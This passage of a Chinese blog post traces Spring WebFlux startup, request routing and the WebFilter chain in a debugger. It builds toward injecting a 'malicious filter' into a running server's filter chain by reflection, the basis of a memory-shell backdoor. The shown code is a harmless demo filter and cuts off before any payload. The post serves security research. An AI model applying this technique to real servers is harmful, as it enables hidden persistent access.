href="#2-12-2-什么是Flux？" class="headerlink" title="2.12.2 什么是Flux？"></a>2.12.2 什么是Flux？</h3><p><code>Flux</code>表示的是<code>0</code>到<code>N</code>个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地<code>publish</code>元素。也就是说，<code>Flux</code>允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。</p><p>下面是<code>Flux</code>常用的<code>api</code>：</p><table><thead><tr><th align="center">API</th><th align="center">说明</th><th align="center">代码示例</th></tr></thead><tbody><tr><td align="center"><strong><code>Flux.just</code></strong></td><td align="center">创建包含指定元素的<code>Flux</code></td><td align="center"><code>Flux&lt;String&gt; flux = Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);</code></td></tr><tr><td align="center"><strong><code>Flux.fromIterable</code></strong></td><td align="center">从<code>Iterable</code>创建<code>Flux</code></td><td align="center"><code>List&lt;String&gt; list = Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);</code><br><code>Flux&lt;String&gt; flux = Flux.fromIterable(list);</code></td></tr><tr><td align="center"><strong><code>Flux.fromArray</code></strong></td><td align="center">从数组创建<code>Flux</code></td><td align="center"><code>String[] array = &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;&#125;;</code><br><code>Flux&lt;String&gt; flux = Flux.fromArray(array);</code></td></tr><tr><td align="center"><strong><code>Flux.empty</code></strong></td><td align="center">创建一个空的<code>Flux</code></td><td align="center"><code>Flux&lt;Object&gt; emptyFlux = Flux.empty();</code></td></tr><tr><td align="center"><strong><code>Flux.error</code></strong></td><td align="center">创建一个包含错误的<code>Flux</code></td><td align="center"><code>Flux&lt;Object&gt; errorFlux = Flux.error(new RuntimeException(&quot;Something went wrong&quot;));</code></td></tr><tr><td align="center"><strong><code>Flux.range</code></strong></td><td align="center">创建包含指定范围的整数序列的<code>Flux</code></td><td align="center"><code>Flux&lt;Integer&gt; rangeFlux = Flux.range(1, 5);</code></td></tr><tr><td align="center"><strong><code>Flux.interval</code></strong></td><td align="center">创建包含定期间隔的元素的<code>Flux</code></td><td align="center"><code>Flux&lt;Long&gt; intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);</code></td></tr><tr><td align="center"><strong><code>Flux.merge</code></strong></td><td align="center">合并多个Flux，按照时间顺序交织元素</td><td align="center"><code>Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);</code><br><code>Flux&lt;String&gt; flux2 = Flux.just(&quot;C&quot;, &quot;D&quot;);</code><br><code>Flux&lt;String&gt; mergedFlux = Flux.merge(flux1, flux2);</code></td></tr><tr><td align="center"><strong><code>Flux.concat</code></strong></td><td align="center">连接多个<code>Flux</code>，按照顺序发布元素</td><td align="center"><code>Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);</code><br><code>Flux&lt;String&gt; flux2 = Flux.just(&quot;C&quot;, &quot;D&quot;);</code><br><code>Flux&lt;String&gt; concatenatedFlux = Flux.concat(flux1, flux2);</code></td></tr><tr><td align="center"><strong><code>Flux.zip</code></strong></td><td align="center">将多个<code>Flux</code>的元素进行配对，生成<code>Tuple</code></td><td align="center"><code>Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);</code><br><code>Flux&lt;String&gt; flux2 = Flux.just(&quot;1&quot;, &quot;2&quot;);</code><br><code>Flux&lt;Tuple2&lt;String, String&gt;&gt; zippedFlux = Flux.zip(flux1, flux2);</code></td></tr><tr><td align="center"><strong><code>Flux.filter</code></strong></td><td align="center">过滤满足条件的元素</td><td align="center"><code>Flux&lt;Integer&gt; numbers = Flux.range(1, 5);</code><br><code>Flux&lt;Integer&gt; filteredFlux = numbers.filter(n -&gt; n % 2 == 0);</code></td></tr><tr><td align="center"><strong><code>Flux.map</code></strong></td><td align="center">转换每个元素的值</td><td align="center"><code>Flux&lt;String&gt; words = Flux.just(&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;);</code><br><code>Flux&lt;Integer&gt; wordLengths = words.map(String::length);</code></td></tr><tr><td align="center"><strong><code>Flux.flatMap</code></strong></td><td align="center">将每个元素映射到一个<code>Flux</code>，并将结果平铺</td><td align="center"><code>Flux&lt;String&gt; letters = Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);</code><br><code>Flux&lt;String&gt; flatMappedFlux = letters.flatMap(letter -&gt; Flux.just(letter, letter.toLowerCase()));</code></td></tr></tbody></table><h3 id="2-12-3-Spring-WebFlux启动过程分析"><a href="#2-12-3-Spring-WebFlux启动过程分析" class="headerlink" title="2.12.3 Spring WebFlux启动过程分析"></a>2.12.3 Spring WebFlux启动过程分析</h3><p>本来是想先用文字聊一堆关于<code>Spring MVC</code>和<code>Spring WebFlux</code>之间的区别的，但是这个已经被网上现有的不多的关于<code>WebFlux</code>的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖<code>WebFlux</code>的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。</p><p>我们直接在<code>run</code>方法这里下断点，然后直接<code>step into</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122151538700.png"></p><p>一步步地<code>step over</code>之后，我们可以看到调用了<code>org.springframework.boot.SpringApplication#createApplicationContext</code>这个方法（前面的那些方法并不重要，直接略过就行）：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122151616672.png"></p><p>这个方法光听名字<code>createApplicationContext</code>，就感觉很重要，因为字面意思就是创建<code>ApplicationContext</code>，这正是我们感兴趣的内容，我们<code>step into</code>进去看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122152201947.png"></p><p>可以看到，是根据不同的<code>webApplicationType</code>去选择创建不同的<code>context</code>，比如我们这里的<code>webApplicationType</code>就是<code>REACTIVE</code>，也就是响应式的。</p><p>我们<code>step into</code>这里的<code>create</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122152757458.png"></p><p>发现里面有两个静态方法、一个<code>create</code>方法和一个默认实现 <code>DEFAULT</code>，这个默认实现通过加载 <code>ApplicationContextFactory</code> 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 <code>AnnotationConfigApplicationContext</code> 实例。</p><p>我们继续<code>step over</code>走下去，可以看到我们<code>REACTIVE</code>对应的<code>context</code>是<code>AnnotationConfigReactiveWebServerApplicationContext</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122153321207.png"></p><p>继续往下走，我们会回到一开始这里，可以看到接下来会调用<code>prepareContext</code>、<code>refreshContext</code>和<code>afterRefresh</code>方法，这个过程就是一系列的初始化、监听的注册等操作：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122153436756.png"></p><p>我们<code>step into</code>这里的<code>refreshContext</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154347190.png"></p><p>接着<code>step into</code>这里的<code>refresh</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154415854.png"></p><p>进来之后，接着<code>step into</code>这里的<code>refresh</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154457308.png"></p><p>可以看到，这里调用了一个<code>super.refresh</code>，也就是父类的<code>refresh</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154526246.png"></p><p>我们继续<code>step into</code>查看，发现这里调用了<code>onRefresh</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154705098.png"></p><p>我们<code>step into</code>这里的<code>onRefresh</code>，发现它调用了关键的<code>org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122154751318.png"></p><p>继续<code>step over</code>可以看到，由于我们使用的是<code>Netty</code>而不是<code>Tomcat</code>，因此这里最终会调用<code>NettyReactiveWebServerFactory</code>类中的<code>getWebServer</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122155504128.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122155752526.png"></p><p>而上图中的<code>WebServerManager</code>类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象<code>WebServer</code>，另一个是上层方法处理者的抽象<code>DelayedInitializationHttpHandler</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122172421426.png"></p><p>那这个<code>webserver</code>具体是怎么启动的呢？我们继续走到<code>finishRefresh</code>这个方法这里来，如果这里我们直接无脑<code>step over</code>，程序最终会回到<code>run</code>方法，说明，启动<code>webserver</code>的地方肯定就在这个<code>finishRefresh</code>方法里面：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174153904.png"></p><p>我们<code>step into</code>进去看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174401684.png"></p><p>接着<code>step into</code>去看看这里调用的<code>getLifecycleProcessor().onRefresh()</code>方法，发现调用了<code>startBeans</code>方法，并且设置了自启动：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174441696.png"></p><p>我们直接<code>step into</code>这个<code>startBeans</code>方法，一步步地<code>step over</code>过后，会发现调用了<code>start</code>方法，看来我们在逐渐逼近真相：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174628586.png"></p><p>我们继续<code>step into</code>这个<code>start</code>方法，发现调用了<code>org.springframework.context.support.DefaultLifecycleProcessor#doStart</code>这个方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174728904.png"></p><p>直接<code>step into</code>进去看看，发现由于<code>dependenciesForBean</code>为[]，所以没有调用<code>doStart</code>方法，直接就是调用<code>bean.start()</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122174837382.png"></p><p>继续<code>step into</code>这个<code>start</code>方法看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180726791.png"></p><p>怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180840172.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122180857277.png"></p><p>调试了几遍之后发现是我疏忽了，这里的<code>this.lifecycleBeans</code>里面其实有三个，每调用一次<code>doStart</code>方法就会删掉一个：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181045819.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181305946.png"></p><p>可以看到，我们刚才调用的是第一个<code>bean</code>的，所以当然没有启动<code>webserver</code>相关的方法了：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181456742.png"></p><p>我们一步步<code>step over</code>，当<code>memeber.name</code>为<code>webServerStartStop</code>时，我们再<code>step into</code>这个<code>doStart</code>方法里面的<code>bean.start()</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181729409.png"></p><p>即可看到<code>this.weServerManager.start()</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181751790.png"></p><p>我们继续<code>step into</code>这个<code>start</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122181838844.png"></p><p>仔细看看上面红框中的代码，先是初始化<code>HttpHandler</code>，这个方法其实根据<code>lazyInit</code>的值的不同来决定何时初始化，如果<code>lazyInit</code>值为<code>true</code>，那么就等第一次请求到来时才真正初始化；如果为<code>false</code>，那么就在 <code>WebServerManager</code> 的 <code>start</code> 方法中调用 <code>initializeHandler</code> 直接初始化：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182528529.png"></p><p>我们继续步入这里的<code>start</code>方法，发现其位置为<code>org.springframework.boot.web.embedded.netty.NettyWebServer#start</code></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182700152.png"></p><p>到这里才算真正明了，真正的<code>webServer</code>启动的关键方法是<code>org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122182843455.png"></p><p>从下面的<code>this.webServer</code>中也可以看到，绑定的是<code>0.0.0.0:9191</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122183119082.png"></p><h3 id="2-12-4-Spring-WebFlux请求处理过程分析"><a href="#2-12-4-Spring-WebFlux请求处理过程分析" class="headerlink" title="2.12.4 Spring WebFlux请求处理过程分析"></a>2.12.4 Spring WebFlux请求处理过程分析</h3><p>当一个请求过来的时候，<code>Spring WebFlux</code>是如何进行处理的呢？</p><p>这里我们在<code>org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello</code>这里打上断点，然后进行调试，访问<code>http://127.0.0.1:9191/hello</code>触发<code>debug</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122205005835.png"></p><p>一步步地<code>step over</code>后来到<code>org.springframework.web.reactive.DispatcherHandler#invokeHandler</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122210839343.png"></p><p><code>step into</code>之后可以看到是<code>org.springframework.web.reactive.DispatcherHandler#handle</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122210930120.png"></p><p>解释上面代码中的<code>return</code>部分，首先检查<code>handlerMappings</code>是否为<code>null</code>，如果是，那就调用<code>createNotFoundError</code>方法返回一个表示未找到处理程序的<code>Mono</code>；接着通过<code>CorsUtils.isPreFlightRequest</code>方法检查是否为预检请求，如果是，那就调用<code>handlePreFlight</code>方法处理预检请求，如果不是预检请求且<code>handlerMappings</code>不为<code>null</code>，通过一系列的操作，获取到请求的<code>handler</code>，然后调用<code>invokeHandler</code>方法执行处理程序，再调用<code>handleResult</code>方法处理执行结果，最终返回一个表示处理完成的<code>Mono</code>。</p><p>左下角的<code>Threads &amp; Variables</code>这里，我们往下翻，可以看到在此之前是调用了一个<code>org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122213235191.png"></p><p>我们把之前的断点去掉，然后在该函数这里打上断点：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122214012047.png"></p><p>发现调用了<code>org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal</code>，我们再回去看，发现调用位置在<code>org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122215515467.png"></p><p>点击去：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222157225.png"></p><p>这里最终创建的是<code>DefaultServerRequest</code>对象，需要注意的是在创建该对象时将<code>RouterFunctionMapping</code>中保存的<code>HttpMessageReader</code>列表作为参数传入，这样<code>DefaultServerRequest</code>对象就有了解析参数的能力。</p><p>回到<code>getHandlerInternal</code>这个函数，看它的<code>return</code>里面的匿名函数，发现其调用了<code>org.springframework.web.reactive.function.server.RouterFunction#route</code>，我们点进去看看：</p><p>发现只是在接口中定义了下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222804578.png"></p><p>于是去翻之前的<code>Threads &amp; Variables</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122222845434.png"></p><p>首先调用<code>this.predicate.test</code>方法来判断传入的<code>ServerRequest</code>是否符合路由要求，如果匹配到了处理方法，那就将保存的<code>HandlerFunction</code>实现返回，否则就返回空的<code>Mono</code>。</p><p>点进去这个<code>test</code>方法，发现还是个接口，结合之前的<code>RouterFunction.java</code>和<code>RouterFunctions.java</code>的命名规则，合理猜测<code>test</code>方法的实现应该是在<code>RequestPredicates.java</code>里面。果然是有的，我们取消之前下的所有断点，在<code>test</code>函数这里重新打上断点后调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122223953217.png"></p><p>可以看到这里已经拿到了<code>pattern</code>，那就还差解析<code>request</code>里面的<code>GET</code>这个方法了：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240122234829435.png"></p><p>我们继续<code>step over</code>，发现直接跳到了这里，我当时就挺纳闷儿，这里的<code>this.left</code>和<code>this.right</code>怎么就已知了：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123000521320.png"></p><p>这俩变量已知说明在执行<code>test</code>之前肯定是已经被赋值了，我继续往后<code>step over</code>，从下图中可以看到，此时二者之间多了个<code>&amp;&amp;</code>，不难猜测，应该是调用了<code>org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate</code>方法，因为还有一个<code>OrRequestPredicate</code>，这个<code>or</code>的话应该就是<code>||</code>了：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123000839479.png"></p><p>于是我们再在<code>AndRequestPredicate</code>方法这打上断点，此时我们还没有访问<code>http://127.0.0.1:9191/hello</code>，就已经触发调试了，这是因为我们在<code>GreetingRouter.java</code>里面写的代码中有<code>GET</code>方法、<code>/hello</code>路由还有<code>and</code>方法，因此会调用到<code>AndRequestPredicate</code>，并把<code>GET</code>和<code>/hello</code>分别复制给<code>this.left</code>和<code>this.right</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001430128.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001241437.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123001306237.png"></p><p>到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们<code>2.12.3</code>节中的分析中已经基本涉及到了。我们还是在<code>org.springframework.web.reactive.DispatcherHandler#invokeHandler</code>打下断点调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002322377.png"></p><p>可以看到，这里的<code>this.handlerAdapters</code>里面有四个<code>handlerAdapter</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002406757.png"></p><p>并不是所有的<code>handlerAdapter</code>都会触发<code>handle</code>方法，只有当支持我们给定的<code>handler</code>的<code>handlerAdapter</code>才可以调用：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002524030.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002714255.png"></p><p>然后我们<code>step into</code>这里的<code>handlerAdapter.handle</code>方法，发现是在<code>org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002806521.png"></p><p>而这里的<code>handlerFunction.handle</code>也就是我们编写的<code>route</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240123002927429.png"></p><p>到这里，关于处理请求的部分也就完结了。</p><h3 id="2-12-5-Spring-WebFlux过滤器WebFilter运行过程分析"><a href="#2-12-5-Spring-WebFlux过滤器WebFilter运行过程分析" class="headerlink" title="2.12.5 Spring WebFlux过滤器WebFilter运行过程分析"></a>2.12.5 Spring WebFlux过滤器WebFilter运行过程分析</h3><p>对于<code>Spring WebFlux</code>而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用<code>Filter</code>，关于这一部分知识可以参考Spring的官方文档：</p><blockquote><p><a href="https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html">https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html</a></p></blockquote><p>而在<code>Spring Webflux</code>中，存在两种类型的过滤器：一个是<code>WebFilter</code>，实现自<code>org.springframework.web.server.WebFilter</code>接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到<code>handler</code>之前或者之后执行一些逻辑；另一个就是<code>HandlerFilterFunction</code>，它是一种函数式编程的过滤器类型，实现自<code>org.springframework.web.reactive.function.server.HandlerFilterFunction</code>接口，与<code>WebFilter</code>相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。</p><p>这里我们以<code>WebFilter</code>为例，看看它的运行过程。新建一个<code>GreetingFilter.java</code>，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.webfluxmemoryshelldemo.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.util.pattern.PathPattern;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.util.pattern.PathPatternParser;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain)</span> &#123;</span><br><span class="line">        PathPattern pattern=<span class="keyword">new</span> <span class="title class_">PathPatternParser</span>().parse(<span class="string">&quot;/hello/**&quot;</span>);</span><br><span class="line">        ServerHttpRequest request=serverWebExchange.getRequest();</span><br><span class="line">        <span class="keyword">if</span> (pattern.matches(request.getPath().pathWithinApplication()))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello, this is our filter!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> webFilterChain.filter(serverWebExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240124143107182.png"></p><p>我们直接在<code>filter</code>函数这里下断点，进行调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240125211900082.png"></p><p>注意到<code>return</code>中调用了<code>filter</code>函数，于是<code>step into</code>看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240125220915532.png"></p><p>可以看到是调用了<code>invokeFilter</code>函数。我们仔细看看这个<code>DefaultWebFilterChain</code>类：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126131433346.png"></p><p>可以看到是有三个名为<code>DefaultWebFilterChain</code>的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建<code>chain</code>的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话：</p><blockquote><p>Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link.</p><p><img src="C:\Users\test\AppData\Roaming\Typora\typora-user-images\image-20240126131914865.png"></p></blockquote><p>也就是说，通过调用 <code>DefaultWebFilterChain</code> 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个<code>link</code>，而不是一个<code>chain</code>，这就意味着我们无法通过修改下图中的<code>chain.allFilters</code>来实现新增<code>Filter</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126132330870.png"></p><p>但是这个类里面有个<code>initChain</code>方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133115205.png"></p><p>那我们就看看这个公共构造方法是在哪里调用的：</p><p>光标移至该方法，按两下<code>Ctrl+Alt+F7</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133242721.png"></p><p>调用的地方位于<code>org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133330601.png"></p><p>那思路就来了，我们只需要构造一个<code>DefaultWebFilterChain</code>对象，，然后把它通过反射写入到<code>FilteringWebHandler</code>类对象的<code>chain</code>属性中就可以了。</p><p>那现在就剩下传入<code>handler</code>和<code>filters</code>这两个参数了，这个<code>handler</code>参数很好搞，就在<code>chain</code>里面：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126133836697.png"></p><p>然后这个<code>filters</code>的话，我们可以先获取到它本来的<code>filters</code>，然后把我们自己写的恶意<code>filter</code>放进去，放到第一位，就可以了。</p><p>那现在就是从内存中找到<code>DefaultWebFilterChain</code>的位置，然后一步步反射就行。这里直接使用工具<code>https://github.com/c0ny1/java-object-searcher</code>，克隆下来该项目，放到<code>idea</code>中<code>mvn clean install</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126134339217.png" alt="image-20240126134339217"></p><p>然后把生成的这个<code>java-object-searcher-0.1.0.jar</code>放到我们的<code>WebFluxMemoryShellDemo</code>项目的Project <code>Structure</code>中的<code>Libraries</code>中：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126145032760.png"></p><p>然后我们把我们的<code>GreetingFilter.java</code>的代码修改成下面的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.webfluxmemoryshelldemo.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.util.pattern.PathPattern;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.util.pattern.PathPatternParser;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Blacklist;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.entity.Keyword;</span><br><span class="line"><span class="keyword">import</span> me.gv7.tools.josearcher.searcher.SearchRequstByBFS;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain)</span> &#123;</span><br><span class="line">        PathPattern pattern=<span class="keyword">new</span> <span class="title class_">PathPatternParser</span>().parse(<span class="string">&quot;/hello/**&quot;</span>);</span><br><span class="line">        ServerHttpRequest request=serverWebExchange.getRequest();</span><br><span class="line">      